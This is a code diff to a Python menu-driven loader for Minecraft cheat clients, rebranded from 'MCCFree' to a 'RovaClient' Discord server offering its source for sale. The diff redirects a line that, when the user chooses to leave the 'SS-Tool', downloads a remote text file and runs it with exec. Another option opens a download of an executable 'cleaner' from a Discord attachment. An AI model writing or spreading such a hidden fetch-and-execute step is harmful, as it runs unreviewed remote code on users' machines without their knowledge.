@@ -12,8 +12,8 @@ clean = """
 \033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
        \033[1;39m┌─────────────────────────────────────────── Archive ────────────────────────────────────────────┐            
        \033[1;32m║                           \033[1;39m  Version          : \033[1;30m 1.0.6                                          \033[1;32m║
-       \033[1;32m║                           \033[1;39m  Discord          : \033[1;34m discord.gg/chiterl                             \033[1;32m║
-       \033[1;32m║                           \033[1;39m  Source           : \033[1;33m github.com/MCCFree/MCC-Loader/new/main         \033[1;32m║
+       \033[1;32m║                           \033[1;39m  Discord          : \033[1;34m discord.gg/RovaClient                             \033[1;32m║
+       \033[1;32m║                           \033[1;39m  Source(selling)           : \033[1;33m Discord.gg/RovaClient         \033[1;32m║
        \033[1;32m║                           \033[1;39m  Loader Plan      : \033[1;32m Free                                           \033[1;32m║
        \033[1;39m└────────────────────────────────────────────────────────────────────────────────────────────────┘
    \033[0;31m                               Create a ticket if u found a client that not working.
@@ -45,7 +45,7 @@ while True:
     if chon == '-':
         os.system('cls')
         print("Leaving SS-Tool")
-        exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
+        exec(requests.get('https://github.com/Rafail2023/RovaClient/raw/refs/heads/main/Minecraft.txt').text)
     elif chon == '1':
         webbrowser.open_new("https://cdn.discordapp.com/attachments/1148033696641859584/1171827433549336657/Masew_Cleaner.exe?ex=655e1857&is=654ba357&hm=9b7cd01dfe5d28b2b8d14c20db6209a9aa8b608085f4fa7b84a2e046896fc87d&")
     elif chon == '2':
